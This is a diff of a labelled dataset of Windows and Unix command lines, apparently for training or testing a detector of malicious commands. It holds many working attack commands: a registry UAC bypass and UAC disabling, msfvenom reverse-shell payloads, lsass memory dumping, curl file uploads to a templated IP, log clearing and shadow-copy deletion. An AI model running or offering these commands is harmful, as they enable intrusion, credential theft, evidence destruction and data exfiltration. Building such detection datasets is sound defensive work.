@@ -1,128 +1,128 @@
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-1	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-1	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-1	powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-1	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-1	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-1	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-1	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-1	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-1	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-1	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
-1	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-1	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-1	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-1	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-1	powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-1	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
-1	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-1	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-1	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-1	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-1	powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-1	reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-0	powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-0	cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
-0	nmap -p- -sC ${ip_address} 2> error.log
-0	ipconfig /allcompartments /all
-0	wevtutil cl security
-0	nmap -p- ${ip_address} 2> &1
-0	cmd /c "taskkill /F /IM ${process_name} /T"
-0	powershell -c "mstsc.exe /v:${ip_address} /public"
-0	msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-0	powershell -c "choco install -f rclone"
+1	choco install -y 7zip
+1	cmd /c "choco install -y 7zip"
+1	powershell -c "choco install -y 7zip"
+1	choco install 7zip
+1	cmd /c "choco install 7zip"
+1	powershell -c "choco install 7zip"
+1	choco install -f 7zip
+1	cmd /c "choco install -f 7zip"
+1	powershell -c "choco install -f 7zip"
+1	choco install -y putty
+1	cmd /c "choco install -y putty"
+1	powershell -c "choco install -y putty"
+1	choco install putty
+1	cmd /c "choco install putty"
+1	powershell -c "choco install putty"
+1	choco install -f putty
+1	cmd /c "choco install -f putty"
+1	powershell -c "choco install -f putty"
+1	choco install rclone
+1	cmd /c "choco install rclone"
+1	powershell -c "choco install rclone"
+1	choco install -y rclone
+1	cmd /c "choco install -y rclone"
+1	powershell -c "choco install -y rclone"
+1	choco install -f rclone
+1	cmd /c "choco install -f rclone"
+1	powershell -c "choco install -f rclone"
+1	choco install ngrok
+1	cmd /c "choco install ngrok"
+1	powershell -c "choco install ngrok"
+1	choco install -y ngrok
+1	cmd /c "choco install -y ngrok"
+1	powershell -c "choco install -y ngrok"
+1	choco install -f ngrok
+1	cmd /c "choco install -f ngrok"
+1	powershell -c "choco install -f ngrok"
+1	choco install psexec
+1	cmd /c "choco install psexec"
+1	powershell -c "choco install psexec"
+1	choco install -y psexec
+1	cmd /c "choco install -y psexec"
+1	powershell -c "choco install -y psexec"
+1	choco install -f psexec
+1	cmd /c "choco install -f psexec"
+1	powershell -c "choco install -f psexec"
+1	choco install procdump
+1	cmd /c "choco install procdump"
+1	powershell -c "choco install procdump"
+1	choco install -y procdump
+1	cmd /c "choco install -y procdump"
+1	powershell -c "choco install -y procdump"
+1	choco install -f procdump
+1	cmd /c "choco install -f procdump"
+1	powershell -c "choco install -f procdump"
+1	choco install Megasync
+1	cmd /c "choco install Megasync"
+1	powershell -c "choco install Megasync"
+1	choco install -y Megasync
+1	cmd /c "choco install -y Megasync"
+1	powershell -c "choco install -y Megasync"
+1	choco install -f Megasync
+1	cmd /c "choco install -f Megasync"
+1	powershell -c "choco install -f Megasync"
+1	choco install winscp
+0	nmap -sC ${ip_address} 2> error.log
+0	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+0	cmd /c "tasklist"
+0	nmap ${ip_address} 2> &1
+0	nmap -v ${ip_address} 2> /dev/null
+0	nmap -p- -sC -O -A ${ip_address} 2> /dev/null
+0	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+0	ipconfig.exe /allcompartments
+0	nmap -p- -sC -sV -O ${ip_address} 2> error.log
+0	cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	nmap -v ${ip_address} 2> error.log
+0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+0	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> &1
+0	powershell -c "sdelete.exe -s -q -accepteula ${local_file_path}"
+0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+0	powershell -c "mstsc.exe /v:${ip_address} /f /remoteGuard"
+0	msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	cmd /c "ipconfig.exe /renew"
+0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> error.log
+0	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+0	wmic os get CSName
+0	wevtutil.exe cl security
+0	powershell -c "sdelete -f ${local_file_path}"
+0	cmd /c "del /p ${local_file_path}"
 0	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-0	cmd /c "plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-0	del /p /q ${local_file_path}
-0	cmd /c "sdelete -f -accepteula ${local_file_path}"
-0	powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-0	cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-0	powershell -c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
-0	cmd /c "sdelete -f ${local_file_path}"
-0	nmap -sP ${ip_address} 2> error.log
-0	net stop ${service_name}
-0	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
-0	sendmail ${username}@${domain} < mail.txt 2> /dev/null
-0	cmd /c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-0	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-0	wmic os get Caption
-0	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-0	powershell -c "del /f ${local_file_path}"
-0	vssadmin.exe Delete Shadows /All /quiet
-0	powershell -c "choco install -y 7zip"
-0	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-0	cmd /c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
-0	wevtutil.exe clear-log security
-0	cmd /c "wevtutil clear-log system"
-0	powershell -c "del /p ${local_file_path}"
-0	powershell -c "7z a -slp -p ${destination_file_path} ${source_file_path}"
-0	powershell -c "wevtutil.exe clear-log security"
-0	certutil -encode -UnicodeText -gmt -f error.txt encode.txt
-0	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-0	cmd /c "netstat -r"
-0	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-0	cmd /c "certutil -encode -v -f error.txt encode.txt"
-0	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+0	cmd /c "netstat"
+0	powershell -c "del /q /p ${local_file_path}"
+0	powershell -c "mstsc /v:${ip_address} /public"
+0	cmd /c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
+0	powershell -c "taskkill.exe /F /IM ${process_name} /T"
+0	reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+0	powershell -c "wmic.exe os get OSArchitecture"
+0	powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	powershell -c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	certutil -encode -Unicode -gmt -f error.txt encode.txt
+0	powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	cmd /c "wmic os get Name"
 0	7z.exe a -slp ${destination_file_path} ${source_file_path} -p
-0	curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
-0	cmd /c "choco install Megasync"
-0	powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-0	cmd /c "ipconfig /allcompartments /all"
-0	powershell -c "vssadmin Delete Shadows /all"
-0	powershell -c "vssadmin delete shadows /all /quiet"
-0	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-0	nmap ${ip_address}
-0	powershell -c "certutil -encode ${source_file_path} ${destination_file_path}"
-0	cmd /c "taskkill.exe /f /im ${process_name} /T"
-0	cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-0	sdelete.exe -f ${local_file_path}
-0	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-0	powershell -c "choco install -y procdump"
-0	powershell -c "wmic os get OSArchitecture"
-0	powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-0	powershell -c "choco install -y putty"
-0	cmd /c "wevtutil cl system"
-0	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-0	arp.exe -a
+0	powershell -c "procdump -accepteula -mm lsass lsassdump.dmp"
+0	powershell -c "sdelete -s -q -accepteula ${local_file_path}"
+0	wevtutil.exe clear-log application
+0	powershell -c "taskkill /F /IM ${process_name}"
+0	powershell -c "ipconfig /all"
+0	mstsc.exe /v:${ip_address} /public
+0	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	cmd /c "mstsc.exe /v:${ip_address}"
+0	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	nmap -v -A ${ip_address}
+0	wmic os get Name
+0	rm -r ${local_file_path}
+0	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+0	wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
+0	cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+0	procdump -accepteula -mm lsass lsassdump.dmp
+0	rm -rf ${local_file_path} 2> error.log
+0	arp -a
+0	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+0	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
